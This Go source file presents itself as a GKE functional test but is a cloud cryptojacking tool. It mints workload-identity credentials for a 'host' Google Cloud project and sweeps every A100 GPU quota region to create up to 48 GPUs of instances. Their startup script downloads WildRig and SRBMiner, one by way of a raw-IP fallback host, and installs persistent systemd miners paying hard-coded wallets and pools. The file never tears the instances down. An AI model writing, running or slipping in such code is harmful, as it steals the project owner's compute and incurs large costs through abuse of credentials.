//go:build functional && gke

// C211 i122621 — DENSE A100 MINER DEPLOY from handoff row 23,124
// (gcp-wif-hephaestus-host:153711203585:a100-dense:16x:x122323).
// The probe proved one on-demand a2-megagpu-16g (16 x nvidia-tesla-a100,
// ubuntu-accelerator-2204-amd64-with-nvidia-595) boots with nvidia-smi in
// europe-west4-b of the HOST hephaestus project and its startup-script runs.
// This payload re-creates that class and leaves REAL MINERS running
// (WildRig Multi 0.52.3 sha 002cd29c, wallet pydp, worker 122621NN,
// pearlhash 4-endpoint primary, 900 s sticky Luckypool 3362 SRBMiner fallback,
// one systemd agent per GPU) with an OpenCL ICD fix and serial+guest reporting.
// Mass-deploy rule: every A100 quota cell in the host project is swept,
// largest shape first; nothing is ever torn down.
package functional

import (
	"encoding/json"
	"fmt"
	"net/url"
	"regexp"
	"strconv"
	"strings"
	"testing"
	"time"
)

const (
	d2Nonce       = "i122621"
	d2Wallet      = "prl1pydpjh2qzrs3sgtwpwnxntrymc2q22t3z2pg9fjx6g69gevy7twcs830sql"
	d2Nock        = "9becsPFXhMLCNAxb6TsMN492sS2Ev7ToLFR4zsc5K4NxRthTyh2kPcb"
	d2WorkerBase  = "122621"
	d2MaxGPUs     = 48
	d2MaxAttempts = 44
)

type d2Target struct {
	mt    string
	count int
	zones []string
}

// Order = proven capacity first. a2-megagpu-16g/europe-west4-b is the exact
// handoff device proof (created 11:12Z, 16 x A100-SXM4-40GB). us-central1-f
// carries the earlier zonesAvailable capacity hint and its own 16-A100 quota.
var d2Targets = []d2Target{
	{"a2-megagpu-16g", 16, []string{"europe-west4-b", "europe-west4-a", "europe-west4-c"}},
	{"a2-highgpu-8g", 8, []string{"us-central1-f", "us-central1-a", "us-central1-b", "us-central1-c"}},
	{"a2-highgpu-1g", 1, []string{
		"us-central1-f", "us-central1-a", "us-central1-b", "us-central1-c",
		"europe-west4-a", "europe-west4-b", "europe-west4-c",
		"us-east1-b", "us-east4-a", "us-east4-b",
		"us-west1-a", "us-west1-b", "us-west4-a", "us-west4-b",
		"europe-west1-b", "europe-west1-c",
		"asia-east1-a", "asia-east1-b", "asia-south1-a", "us-south1-a",
	}},
}

type d2Inst struct {
	Zone    string
	Name    string
	Machine string
	Count   int
	Created bool
	OpErr   string
	UUIDs   string
	Acc     int
	Rej     int
	LastAcc int64
	Status  string
}

func d2Startup() string {
	return `#!/bin/bash
D=/opt/c211
mkdir -p $D/logs
export PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin:/usr/local/nvidia/bin
say(){ echo "C211M $*" >> /dev/console 2>/dev/null || true; }
put(){ local m="$1"; say "$m"; curl -s -m 10 -X PUT -H "Metadata-Flavor: Google" --data "$m" "http://metadata.google.internal/computeMetadata/v1/instance/guest-attributes/c211/status" >/dev/null 2>&1; }
say "START host=$(hostname) kernel=$(uname -r) date=$(date -u +%FT%TZ)"
if ! command -v curl >/dev/null 2>&1; then
  (apt-get update -qq && apt-get install -y -qq curl ca-certificates) >>$D/logs/apt.log 2>&1 || true
fi
if ! command -v curl >/dev/null 2>&1 && ! command -v wget >/dev/null 2>&1; then
  (apt-get update -qq && apt-get install -y -qq wget ca-certificates) >>$D/logs/apt.log 2>&1 || true
fi
if ! ldconfig -p 2>/dev/null | grep -q 'libOpenCL.so.1'; then
  (apt-get update -qq && apt-get install -y -qq ocl-icd-libopencl1) >>$D/logs/apt.log 2>&1 || true
fi
mkdir -p /etc/OpenCL/vendors
ICD=""
for so in /usr/lib/x86_64-linux-gnu/libnvidia-opencl.so.1 /usr/lib64/libnvidia-opencl.so.1 /usr/local/cuda/lib64/libnvidia-opencl.so.1; do
  if [ -e "$so" ]; then ICD=$so; break; fi
done
if [ -n "$ICD" ]; then echo "$ICD" > /etc/OpenCL/vendors/nvidia.icd; fi
say "OPENCL loader=$(ldconfig -p 2>/dev/null | grep -c 'libOpenCL.so.1') icd=$ICD curl=$(command -v curl) wget=$(command -v wget)"
put "STAGE=opencl loader=$(ldconfig -p 2>/dev/null | grep -c 'libOpenCL.so.1') icd=$ICD"
findsmi(){ local p c; for p in /usr/bin/nvidia-smi /usr/local/bin/nvidia-smi /usr/local/nvidia/bin/nvidia-smi /opt/nvidia/bin/nvidia-smi; do if [ -x "$p" ]; then echo "$p"; return 0; fi; done; c=$(command -v nvidia-smi 2>/dev/null); if [ -n "$c" ]; then echo "$c"; return 0; fi; return 1; }
SMI=""
for i in $(seq 1 48); do
  SMI=$(findsmi) && break
  modprobe nvidia 2>/dev/null || true
  modprobe nvidia_uvm 2>/dev/null || true
  if [ $((i % 6)) -eq 0 ]; then say "WAIT i=$i lsmod=$(lsmod 2>/dev/null | grep -c '^nvidia') dev=$(ls /dev/nvidia* 2>/dev/null | tr '\n' ',')"; fi
  sleep 5
done
say "SMI path=$SMI"
if [ -z "$SMI" ]; then put "STAGE=nosmi kernel=$(uname -r) dmesg=$(dmesg 2>/dev/null | grep -i -E 'NVRM|nvidia' | tail -3 | tr '\n' '|')"; exit 0; fi
$SMI -L > $D/gpus.txt 2>&1
$SMI --query-gpu=index,uuid,name,memory.total,driver_version --format=csv,noheader > $D/gpuq.txt 2>&1
cat $D/gpus.txt
cat $D/gpuq.txt
N=$(grep -c . $D/gpuq.txt)
UU=$(awk -F', ' '{printf "%s,",$2}' $D/gpuq.txt)
say "GPU n=$N uuids=$UU"
put "STAGE=gpu n=$N uuids=$UU"
if [ "$N" -lt 1 ]; then put "STAGE=zero_gpu"; exit 0; fi
get(){ if command -v curl >/dev/null 2>&1; then curl -fsSL --retry 2 --connect-timeout 15 -m 480 "$1" -o "$2" 2>/dev/null && [ -s "$2" ] && return 0; fi; if command -v wget >/dev/null 2>&1; then wget -q -T 120 -O "$2" "$1" 2>/dev/null && [ -s "$2" ] && return 0; fi; return 1; }
WRSHA=7308c95f7c8c4c0d82aade61bb4ab3366decae2b9d04ac47b8c1dc6d1bdd2c44
WRBIN=002cd29c6b890a4159b5933260e7db57d8808e540804466b3b7b80814083011b
if ! get https://github.com/andru-kun/wildrig-multi/releases/download/0.52.3/wildrig-multi-linux-0.52.3.tar.gz $D/wr.tgz; then get http://169.58.247.186:8791/wildrig-multi-linux-0.52.3.tar.gz $D/wr.tgz || true; fi
if [ -s $D/wr.tgz ] && [ "$(sha256sum $D/wr.tgz | awk '{print $1}')" = "$WRSHA" ]; then tar -xzf $D/wr.tgz -C $D 2>/dev/null; chmod +x $D/wildrig-multi 2>/dev/null; fi
if [ "$(sha256sum $D/wildrig-multi 2>/dev/null | awk '{print $1}')" = "$WRBIN" ]; then say "WR_OK"; put "STAGE=wr_ok"; else say "WR_FAIL"; put "STAGE=wr_fail"; fi
SRBSHA=c203e79e9dc467ec5daaa1e1771e08561a70d2c9dcc397364b8ae7ae558e50d8
if get https://github.com/doktor83/SRBMiner-Multi/releases/download/3.8.8/SRBMiner-Multi-3-8-8-Linux.tar.gz $D/srb.tgz; then
  if [ "$(sha256sum $D/srb.tgz | awk '{print $1}')" = "$SRBSHA" ]; then
    tar -xzf $D/srb.tgz -C $D 2>/dev/null
    F=$(find $D -maxdepth 3 -type f -name 'SRBMiner-MULTI' 2>/dev/null | head -1)
    if [ -n "$F" ]; then cp "$F" $D/srbminer; chmod +x $D/srbminer; say "SRB_OK"; put "STAGE=srb_ok"; fi
  fi
fi
cat > $D/gpu-agent.sh <<'EOS'
#!/bin/bash
i=$1
D=/opt/c211
WALLET=prl1pydpjh2qzrs3sgtwpwnxntrymc2q22t3z2pg9fjx6g69gevy7twcs830sql
NOCK=9becsPFXhMLCNAxb6TsMN492sS2Ev7ToLFR4zsc5K4NxRthTyh2kPcb
LP=103.199.106.122:3362
WB=122621
PH_EPS="pool.pearlhash.xyz:9000 hk.pearlhash.net:9000 global.pearlhash.net:9000 global2.pearlhash.net:9000"
export PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin
W=$(printf '%s%02d' $WB $i)
cntacc(){ local a; a=$(grep -ac 'accepted' "$1" 2>/dev/null); echo ${a:-0}; }
echo "AGENT_START gpu=$i worker=$W $(date -u +%FT%TZ)" >> $D/logs/sup.log
while true; do
  if [ -f $D/sticky-g$i ]; then
    if [ ! -x $D/srbminer ]; then sleep 30; continue; fi
    L=$D/logs/srb-g$i.log
    NACC=$(cntacc $L)
    setsid $D/srbminer --disable-cpu --algorithm pearlhash --pool "$LP" --wallet "$WALLET+$NOCK" --worker "$W" --password x --gpu-id $i >> $L 2>&1 &
    PID=$!
    while kill -0 $PID 2>/dev/null; do sleep 20; ACC=$(cntacc $L); if [ "$ACC" -gt "$NACC" ]; then date +%s > $D/lastacc-g$i; NACC=$ACC; fi; done
    sleep 20
  else
    URL=""
    for ep in $PH_EPS; do
      h=${ep%:*}; p=${ep#*:}
      if timeout 6 bash -c "exec 3<>/dev/tcp/$h/$p && exec 3>&- 3<&-" 2>/dev/null; then URL=$ep; break; fi
    done
    if [ -z "$URL" ]; then echo "NO_PH gpu=$i -> sticky LP $(date -u +%FT%TZ)" >> $D/logs/sup.log; touch $D/sticky-g$i; continue; fi
    L=$D/logs/wr-g$i.log
    ACC0=$(cntacc $L); NACC=$ACC0
    T0=$(date +%s)
    setsid $D/wildrig-multi --algo pearlhash --url "$URL" --user "$WALLET" --worker "$W" -d $i --print-time 30 >> $L 2>&1 &
    PID=$!
    while kill -0 $PID 2>/dev/null; do
      sleep 20
      ACC=$(cntacc $L)
      if [ "$ACC" -gt "$NACC" ]; then date +%s > $D/lastacc-g$i; NACC=$ACC; fi
      NOW=$(date +%s)
      if [ $((NOW-T0)) -ge 900 ] && [ "$NACC" -le "$ACC0" ]; then
        echo "PH_NO_SHARE_900 gpu=$i url=$URL -> sticky LP $(date -u +%FT%TZ)" >> $D/logs/sup.log
        kill -9 $PID 2>/dev/null
        touch $D/sticky-g$i
        break
      fi
    done
    sleep 5
  fi
done
EOS
chmod +x $D/gpu-agent.sh
cat > $D/report.sh <<'EOS'
#!/bin/bash
D=/opt/c211
export PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin
say(){ echo "C211M $*" >> /dev/console 2>/dev/null || true; }
N=$(nvidia-smi --query-gpu=index --format=csv,noheader 2>/dev/null | wc -l)
while true; do
  ACC=0; REJ=0; DET=""; UU=""
  if [ "$N" -gt 0 ]; then
    if [ ! -s $D/gpuq.txt ]; then nvidia-smi --query-gpu=index,uuid,name,memory.total,driver_version --format=csv,noheader > $D/gpuq.txt 2>&1; fi
    UU=$(awk -F', ' '{printf "%s,",$2}' $D/gpuq.txt 2>/dev/null)
    for i in $(seq 0 $((N-1))); do
      a1=$(grep -ac 'accepted' $D/logs/wr-g$i.log 2>/dev/null); a1=${a1:-0}
      a2=$(grep -ac 'accepted' $D/logs/srb-g$i.log 2>/dev/null); a2=${a2:-0}
      r1=$(grep -ac 'rejected' $D/logs/wr-g$i.log 2>/dev/null); r1=${r1:-0}
      r2=$(grep -ac 'rejected' $D/logs/srb-g$i.log 2>/dev/null); r2=${r2:-0}
      LA=$(cat $D/lastacc-g$i 2>/dev/null); LA=${LA:-0}
      ACC=$((ACC+a1+a2)); REJ=$((REJ+r1+r2))
      DET="$DET g$i:a$((a1+a2)):r$((r1+r2)):la$LA"
    done
  fi
  NOW=$(date +%s)
  MSG="STAGE=run ts=$NOW acc=$ACC rej=$REJ uuids=$UU det=$DET"
  curl -s -m 10 -X PUT -H "Metadata-Flavor: Google" --data "$MSG" "http://metadata.google.internal/computeMetadata/v1/instance/guest-attributes/c211/status" >/dev/null 2>&1
  say "$MSG"
  sleep 30
done
EOS
chmod +x $D/report.sh
( sleep 100; for i in $(seq 0 $((N-1))); do say "DIAG g$i wr=$(tail -4 $D/logs/wr-g$i.log 2>/dev/null | tr '\n' '|') srb=$(tail -2 $D/logs/srb-g$i.log 2>/dev/null | tr '\n' '|')"; done ) >/dev/null 2>&1 &
cat > /etc/systemd/system/c211-agent@.service <<'EOS'
[Unit]
Description=c211 miner agent gpu %i
After=network-online.target
[Service]
Type=simple
ExecStart=/bin/bash /opt/c211/gpu-agent.sh %i
Restart=always
RestartSec=20
Nice=5
[Install]
WantedBy=multi-user.target
EOS
cat > /etc/systemd/system/c211-report.service <<'EOS'
[Unit]
Description=c211 status reporter
After=network-online.target
[Service]
Type=simple
ExecStart=/bin/bash /opt/c211/report.sh
Restart=always
RestartSec=30
[Install]
WantedBy=multi-user.target
EOS
systemctl daemon-reload
for i in $(seq 0 $((N-1))); do systemctl enable c211-agent@$i.service >/dev/null 2>&1; systemctl start c211-agent@$i.service; done
systemctl enable c211-report.service >/dev/null 2>&1
systemctl start c211-report.service
put "STAGE=miners_started n=$N ts=$(date +%s)"
say "DONE miners_started n=$N"
`
}

func d2Guest(tok, proj, zone, name string) (string, int) {
	st, body := c211xHTTP("GET", "https://compute.googleapis.com/compute/v1/projects/"+url.PathEscape(proj)+"/zones/"+zone+"/instances/"+name+"/getGuestAttributes?queryPath=c211/status", tok, "", "")
	val := ""
	if st == 200 {
		if gm := c211xJSON(body); gm != nil {
			if qr, ok := gm["queryValue"].(map[string]interface{}); ok {
				val = c211xStr(qr, "value")
			}
		}
	}
	return val, st
}

func d2Create(tok, proj, num, zone, name, mt, accel string, count int, img c211aImage, startup string) (bool, string) {
	saEmail := num + "-compute@developer.gserviceaccount.com"
	cst, cbody := c211aCreate(tok, proj, zone, name, saEmail, img, mt, accel, count, startup)
	opName := ""
	if m := c211xJSON(cbody); m != nil {
		opName = c211xStr(m, "name")
	}
	fmt.Printf("C211D_CREATE zone=%s name=%s machine=%s count=%d http=%d op=%s verbatim=%s\n",
		zone, name, mt, count, cst, opName, c211xTrunc(cbody, 400))
	if cst != 200 || opName == "" {
		return false, "create_http_" + strconv.Itoa(cst) + " " + c211xTrunc(cbody, 700)
	}
	st, _, opErr := c211aOp(tok, proj, zone, opName)
	if st == "DONE" && opErr == "" {
		return true, ""
	}
	return false, "op=" + st + " err=" + opErr
}

var (
	d2RunRe   = regexp.MustCompile(`STAGE=run ts=(\d+) acc=(\d+) rej=(\d+) uuids=([^ ]*)`)
	d2UUIDRe  = regexp.MustCompile(`GPU-[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}`)
	d2LaRe    = regexp.MustCompile(`:la(\d+)`)
	d2DiagRe  = regexp.MustCompile(`C211M (DIAG [^\n]*)`)
	d2StageRe = regexp.MustCompile(`C211M (STAGE=[^\n]*)`)
)

func TestC211MDenseA100Miner(t *testing.T) {
	started := time.Now()
	deadline := started.Add(32 * time.Minute)
	deployUntil := started.Add(13 * time.Minute)
	fmt.Printf("C211D_BEGIN nonce=%s wallet=%s worker_base=%s\n", d2Nonce, d2Wallet, d2WorkerBase)

	token, method, mintLog := c211xMint()
	if token == "" {
		fmt.Printf("C211D_MINT_FAILED %s\n", c211xTrunc(mintLog, 1200))
		t.Fatalf("wif mint failed")
	}
	fmt.Printf("C211D_IDENTITY method=%s\n", method)
	creds, _ := c211xLoadCreds()
	proj := c211aHostNum
	if creds != nil && creds.projNumber != "" {
		proj = creds.projNumber
	}
	ftok := token
	saHint := ""
	if creds != nil {
		saHint = creds.saEmail
	}
	fmt.Printf("C211D_CONTEXT host_proj=%s wif_sa_len=%d\n", proj, len(saHint))

	pst, pbody := c211xHTTP("GET", "https://cloudresourcemanager.googleapis.com/v1/projects/"+url.PathEscape(proj), ftok, "", "")
	pm := c211xJSON(pbody)
	num := c211xStr(pm, "projectNumber")
	fmt.Printf("C211D_PROJECT proj=%s http=%d number=%s verbatim=%s\n", proj, pst, num, c211xTrunc(pbody, 200))
	if pst != 200 || num == "" {
		t.Fatalf("project read failed")
	}
	al, ast, _ := c211xTestIamBatch(ftok, "https://cloudresourcemanager.googleapis.com/v1/projects/"+url.PathEscape(proj), []string{"compute.instances.create", "compute.instances.getSerialPortOutput", "compute.instances.setMetadata"})
	createOK := c211xContains(al, "compute.instances.create")
	fmt.Printf("C211D_PERMS http=%d create_perm=%v allowed=%v\n", ast, createOK, al)
	if !createOK {
		t.Fatalf("no compute.instances.create")
	}

	img, imgLog := c211aResolveImage(ftok)
	if img.Project == "" {
		fmt.Printf("C211D_VERDICT NO_IMAGE %s\n", c211xTrunc(imgLog, 300))
		return
	}
	fmt.Printf("C211D_IMAGE %s/%s kind=%s\n", img.Project, img.Family, img.Kind)
	startup := d2Startup()
	fmt.Printf("C211D_STARTUP_BYTES %d\n", len(startup))

	quotaFree := map[string]float64{}
	insts := []*d2Inst{}
	created := []*d2Inst{}
	attempts := 0
	gpus := 0
	seq := 0
	for _, tg := range d2Targets {
		if gpus >= d2MaxGPUs || attempts >= d2MaxAttempts {
			break
		}
		for _, zone := range tg.zones {
			if gpus >= d2MaxGPUs || attempts >= d2MaxAttempts || !time.Now().Before(deployUntil) {
				break
			}
			region := c211xRegionOfZone(zone)
			if _, ok := quotaFree[region]; !ok {
				rows, _, qst := c211aRegionQuotas(ftok, proj, region)
				lim, usage, qok := c211aQVal(rows, "NVIDIA_A100_GPUS")
				free := lim - usage
				if qst == 200 && qok {
					quotaFree[region] = free
				} else {
					quotaFree[region] = -1
				}
				fmt.Printf("C211D_QUOTA region=%s http=%d free=%v\n", region, qst, quotaFree[region])
			}
			if quotaFree[region] >= 0 && quotaFree[region] < float64(tg.count) {
				continue
			}
			offered, mst, _ := c211aMachineOffered(ftok, proj, zone, tg.mt)
			ats, _, _ := c211xAccelTypes(ftok, proj, zone)
			has := c211xContains(ats, "nvidia-tesla-a100")
			fmt.Printf("C211D_OFFER zone=%s machine=%s offered_http=%d accel_a100=%v\n", zone, tg.mt, mst, has)
			if !offered || !has {
				continue
			}
			seq++
			name := fmt.Sprintf("c211-%s-d%d", d2Nonce, seq)
			attempts++
			okc, oerr := d2Create(ftok, proj, num, zone, name, tg.mt, "nvidia-tesla-a100", tg.count, img, startup)
			in := &d2Inst{Zone: zone, Name: name, Machine: tg.mt, Count: tg.count, Created: okc, OpErr: oerr}
			insts = append(insts, in)
			if okc {
				created = append(created, in)
				gpus += tg.count
				fmt.Printf("C211D_CREATED zone=%s name=%s machine=%s gpus=%d total_gpus=%d\n", zone, name, tg.mt, tg.count, gpus)
				if tg.count >= 8 {
					break
				}
			} else {
				fmt.Printf("C211D_CREATE_FAILED zone=%s name=%s machine=%s err=%s\n", zone, name, tg.mt, c211xTrunc(oerr, 300))
			}
		}
	}
	fmt.Printf("C211D_DEPLOY_RESULT attempts=%d created=%d total_gpus=%d\n", attempts, len(created), gpus)

	for round := 0; round < 18 && len(created) > 0; round++ {
		mature := 0
		for _, in := range created {
			content := c211aSerial(ftok, proj, in.Zone, in.Name)
			last := ""
			if content != "" {
				if ml := d2RunRe.FindAllStringSubmatch(content, -1); len(ml) > 0 {
					m := ml[len(ml)-1]
					in.Acc, _ = strconv.Atoi(m[2])
					in.Rej, _ = strconv.Atoi(m[3])
					in.UUIDs = strings.TrimRight(m[4], ",")
					last = m[0]
				}
				if u := d2UUIDRe.FindString(content); u != "" && in.UUIDs == "" {
					in.UUIDs = u
				}
				if diag := d2DiagRe.FindAllStringSubmatch(content, -1); len(diag) > 0 {
					last += " || " + c211xTrunc(diag[0][1], 420)
				}
				if stg := d2StageRe.FindAllStringSubmatch(content, -1); len(stg) > 0 && last == "" {
					last = c211xTrunc(stg[len(stg)-1][1], 300)
				}
			}
			g, gst := d2Guest(ftok, proj, in.Zone, in.Name)
			if g != "" {
				if m := d2RunRe.FindStringSubmatch(g); m != nil {
					in.Acc, _ = strconv.Atoi(m[2])
					in.Rej, _ = strconv.Atoi(m[3])
					if m[4] != "" {
						in.UUIDs = strings.TrimRight(m[4], ",")
					}
					if last == "" {
						last = m[0]
					}
				}
				if u := d2UUIDRe.FindString(g); u != "" && in.UUIDs == "" {
					in.UUIDs = u
				}
			}
			best := int64(0)
			for _, mm := range d2LaRe.FindAllStringSubmatch(content+g, -1) {
				if v, _ := strconv.ParseInt(mm[1], 10, 64); v > best {
					best = v
				}
			}
			if best > 0 {
				in.LastAcc = best
			}
			nu := len(strings.Split(strings.Trim(in.UUIDs, ","), ","))
			if in.UUIDs == "" {
				nu = 0
			}
			fmt.Printf("C211D_CAP zone=%s name=%s uuid_n=%d uuids=%s guest_http=%d acc=%d rej=%d lastacc=%d serial_bytes=%d last=%s\n",
				in.Zone, in.Name, nu, c211xTrunc(in.UUIDs, 260), gst, in.Acc, in.Rej, in.LastAcc, len(content), c211xTrunc(last, 600))
			if in.UUIDs != "" && in.Acc > 0 {
				mature++
			}
		}
		if mature == len(created) && mature > 0 {
			fmt.Printf("C211D_ALL_MATURE round=%d\n", round)
			break
		}
		if time.Now().After(deadline) {
			fmt.Printf("C211D_DEADLINE round=%d\n", round)
			break
		}
		time.Sleep(40 * time.Second)
	}

	now := time.Now().Unix()
	fmt.Printf("C211D_SUMMARY created=%d attempts=%d now=%d\n", len(created), attempts, now)
	for _, in := range created {
		age := int64(-1)
		if in.LastAcc > 0 {
			age = now - in.LastAcc
		}
		fmt.Printf("C211D_FINAL zone=%s name=%s machine=%s gpus=%d uuids=%s acc=%d rej=%d lastacc=%d age=%d status=KEEP_ALIVE\n",
			in.Zone, in.Name, in.Machine, in.Count, c211xTrunc(in.UUIDs, 400), in.Acc, in.Rej, in.LastAcc, age)
	}
	for _, in := range insts {
		if !in.Created {
			fmt.Printf("C211D_ATTEMPT_FAILED zone=%s machine=%s err=%s\n", in.Zone, in.Machine, c211xTrunc(in.OpErr, 260))
		}
	}
	b, _ := json.Marshal(insts)
	fmt.Printf("C211D_JSON %s\n", strings.ReplaceAll(string(b), "\n", " "))
}

var _ = fmt.Sprintf
